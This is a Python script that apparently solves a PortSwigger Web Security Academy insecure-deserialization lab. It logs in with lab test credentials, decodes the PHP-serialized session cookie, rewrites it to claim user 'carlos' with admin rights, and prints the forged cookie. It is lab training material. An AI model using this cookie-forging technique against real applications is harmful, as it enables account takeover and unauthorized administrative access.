# https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects
# pip3 install phpserialize
import requests
import utils
import urllib.parse
import phpserialize
from base64 import b64decode, b64encode

session = requests.Session()

base_url = 'https://acfb1fd01ee8eede803b175700bc00e7.web-security-academy.net'

# login as wiener:peter
url = '%s/login' % base_url

print('logging in as wiener:peter')
request_response = session.post(url, data='username=wiener&password=peter')

if 'Hello, wiener!' not in request_response.text:
    exit('failed to login as wiener:peter')

# get and b64 decode cookie
session_cookie = urllib.parse.unquote(session.cookies.get('session'))
decoded_session_cookie = b64decode(session_cookie)

# unserialize php object from cookie to user_object
user_object = phpserialize.loads(
    decoded_session_cookie, object_hook=phpserialize.phpobject)

# change user_object stuff
user_object.__setattr__(b'username', 'carlos')
user_object.__setattr__(b'admin', 1)

# b64 encode back to serialized php object
carlos_session_cookie_value = b64encode(
    phpserialize.dumps(user_object)).decode('utf-8')

print('session cookie val for carlos: %s' % carlos_session_cookie_value)
